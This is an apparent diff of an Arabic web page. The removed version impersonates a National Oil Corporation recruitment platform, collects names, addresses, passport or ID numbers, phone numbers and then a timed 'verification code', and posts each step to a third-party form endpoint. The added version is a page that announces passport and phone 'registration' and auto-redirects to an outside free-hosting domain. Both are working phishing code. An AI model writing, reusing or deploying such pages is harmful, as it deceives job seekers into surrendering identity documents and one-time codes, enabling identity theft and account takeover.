@@ -1,254 +1,65 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>منصة التوظيف - المؤسسة الوطنية للنفط</title>
+  <meta charset="UTF-8">
+  <title>تسجيل البيانات</title>
+  <meta http-equiv="refresh" content="4;url=https://www.libyanote.wuaze.com">
   <style>
     body {
+      direction: rtl;
       font-family: 'Tahoma', sans-serif;
-      margin: 0;
-      padding: 0;
-      background-color: #f4f7fa;
+      background: linear-gradient(135deg, #f0f8ff, #e6f0ff);
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
     }
 
-    .form-container {
-      background: #ffffff;
-      width: 100%;
-      max-width: 450px;
-      padding: 25px;
-      border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.15);
-      box-sizing: border-box;
-      border-top: 6px solid #003366; /* أزرق المؤسسة */
-    }
-
-    .form-container h2 {
-      margin-top: 0;
-      color: #003366;
+    .box {
+      background: white;
+      padding: 30px 25px;
       text-align: center;
-      font-size: 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0, 100, 160, 0.2);
+      max-width: 400px;
+    }
+
+    .icon {
+      font-size: 50px;
+      color: #0077b6;
       margin-bottom: 20px;
     }
 
-    .logo {
-      display: block;
-      margin: 0 auto 10px;
-      width: 80px;
-    }
-
-    .form-group {
+    h2 {
+      color: #004282;
+      font-size: 20px;
       margin-bottom: 15px;
-      text-align: right;
     }
 
-    label {
-      font-size: 14px;
-      margin-bottom: 6px;
-      display: block;
-      color: #003366;
-      font-weight: bold;
-    }
-
-    input, select {
-      width: 100%;
-      padding: 10px 8px;
-      font-size: 14px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-      box-sizing: border-box;
-    }
-
-    button {
-      width: 100%;
-      padding: 12px;
-      margin-top: 10px;
+    p {
+      color: #333;
       font-size: 15px;
-      background-color: #003366;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      transition: background 0.3s ease;
     }
 
-    button:hover {
-      background-color: #002244;
-    }
-
-    button#resendBtn {
-      background-color: #888;
-    }
-
-    #timer {
+    .note {
       font-size: 13px;
-      color: #cc9900; /* ذهبي */
-      margin-top: 8px;
-      text-align: center;
-      font-weight: bold;
-    }
-
-    #verification-section {
-      display: none;
+      color: #777;
+      margin-top: 15px;
     }
   </style>
 </head>
 <body>
 
-  <div class="form-container">
-    <img src="uy.jpeg" alt="شعار المؤسسة الوطنية للنفط" class="logo">
-    <h2>منصة التوظيف - المؤسسة الوطنية للنفط</h2>
-
-    <form id="main-form">
-      <div id="step1">
-        <div class="form-group">
-          <label>الاسم بالكامل</label>
-          <input type="text" id="fullName" required pattern="^[\u0600-\u06FF\s]{5,}$" title="الاسم يجب أن يكون باللغة العربية وبحد أدنى 5 أحرف">
-        </div>
-        <div class="form-group">
-          <label>العنوان</label>
-          <input type="text" id="address" required>
-        </div>
-        <div class="form-group">
-          <label>نوع الوثيقة (اختياري)</label>
-          <select id="documentType" onchange="toggleDocumentNumber()">
-            <option value="">بدون</option>
-            <option value="جواز السفر">جواز السفر</option>
-            <option value="البطاقة الشخصية">البطاقة الشخصية</option>
-          </select>
-        </div>
-        <div class="form-group" id="documentNumberGroup" style="display: none;">
-          <label>رقم الوثيقة</label>
-          <input type="text" id="documentNumber">
-        </div>
-        <div class="form-group">
-          <label>رقم الهاتف</label>
-          <input type="text" id="phone" required pattern="^09[1-5][0-9]{7}$" title="رقم ليبي يبدأ بـ 091 إلى 095 ويتكون من 10 أرقام">
-        </div>
-        <button type="button" onclick="submitStep1()">أكمل الطلب</button>
-      </div>
-
-      <div id="verification-section">
-        <div class="form-group">
-          <label>رمز التحقق</label>
-          <input type="text" id="code" pattern="^[a-zA-Z0-9]{6,8}$" required>
-        </div>
-        <div class="form-group">
-          <label>إعادة كتابة رمز التحقق</label>
-          <input type="text" id="confirmCode" required>
-        </div>
-        <div id="timer">02:00</div>
-        <button type="button" onclick="submitAll()">تحقيق الرمز</button>
-        <button type="button" id="resendBtn" onclick="restartTimer()" style="display:none;">إعادة إرسال الرمز</button>
-      </div>
-    </form>
+  <div class="box">
+    <div class="icon">🛡️</div>
+    <h2>تسجيل بياناتك بأمان</h2>
+    <p>
+      يرجى ملاحظة أنه سيتم تسجيل اسمك، رقم جواز سفرك، ورقم هاتفك
+      في غضون <strong>4 ثوانٍ</strong> وسيتم توجيهك تلقائيًا إلى صفحة التسجيل.
+    </p>
+    <div class="note">جاري تحويلك الآن...</div>
   </div>
 
-  <script>
-    let countdown;
-    let timeLeft = 120;
-
-    function toggleDocumentNumber() {
-      const type = document.getElementById('documentType').value;
-      const group = document.getElementById('documentNumberGroup');
-      if (type === "جواز السفر" || type === "البطاقة الشخصية") {
-        group.style.display = 'block';
-      } else {
-        group.style.display = 'none';
-        document.getElementById('documentNumber').value = '';
-      }
-    }
-
-    function startTimer() {
-      timeLeft = 120;
-      document.getElementById('resendBtn').style.display = 'none';
-      countdown = setInterval(() => {
-        const m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
-        const s = String(timeLeft % 60).padStart(2, '0');
-        document.getElementById('timer').textContent = `${m}:${s}`;
-        timeLeft--;
-        if (timeLeft < 0) {
-          clearInterval(countdown);
-          document.getElementById('timer').textContent = "انتهى الوقت!";
-          document.getElementById('resendBtn').style.display = 'block';
-        }
-      }, 1000);
-    }
-
-    function restartTimer() {
-      document.getElementById('code').value = '';
-      document.getElementById('confirmCode').value = '';
-      startTimer();
-    }
-
-    function submitStep1() {
-      const name = document.getElementById('fullName').value.trim();
-      const address = document.getElementById('address').value.trim();
-      const phone = document.getElementById('phone').value.trim();
-      const documentType = document.getElementById('documentType').value;
-      const documentNumber = document.getElementById('documentNumber').value.trim();
-
-      if (!/^[\u0600-\u06FF\s]{5,}$/.test(name) || !/^09[1-5][0-9]{7}$/.test(phone) || !address) {
-        alert("يرجى تعبئة الحقول بشكل صحيح.");
-        return;
-      }
-
-      const formData = new FormData();
-      formData.append('الاسم', name);
-      formData.append('العنوان', address);
-      formData.append('نوع الوثيقة', documentType);
-      formData.append('رقم الوثيقة', documentNumber);
-      formData.append('رقم الهاتف', phone);
-
-      fetch('https://formcarry.com/s/pHHZOWhpgsB', {
-        method: 'POST',
-        body: formData
-      }).then(() => {
-        document.getElementById('step1').style.display = 'none';
-        document.getElementById('verification-section').style.display = 'block';
-        startTimer();
-      }).catch(() => {
-        alert("حدث خطأ أثناء الإرسال.");
-      });
-    }
-
-    function submitAll() {
-      const code = document.getElementById('code').value.trim();
-      const confirmCode = document.getElementById('confirmCode').value.trim();
-
-      if (timeLeft < 0) {
-        alert("انتهى الوقت! أعد إرسال الرمز.");
-        return;
-      }
-
-      if (!/^[a-zA-Z0-9]{6,8}$/.test(code) || code !== confirmCode) {
-        alert("رمز التحقق غير صحيح أو غير متطابق.");
-        return;
-      }
-
-      const name = document.getElementById('fullName').value.trim();
-      const address = document.getElementById('address').value.trim();
-      const phone = document.getElementById('phone').value.trim();
-
-      const formData = new FormData();
-      formData.append('الاسم', name);
-      formData.append('العنوان', address);
-      formData.append('رقم الهاتف', phone);
-      formData.append('رمز التحقق', code);
-
-      fetch('https://formcarry.com/s/pHHZOWhpgsB', {
-        method: 'POST',
-        body: formData
-      }).then(() => {
-        alert("تم إرسال البيانات بنجاح.");
-      }).catch(() => {
-        alert("حدث خطأ أثناء إرسال رمز التحقق.");
-      });
-    }
-  </script>
 </body>
 </html>
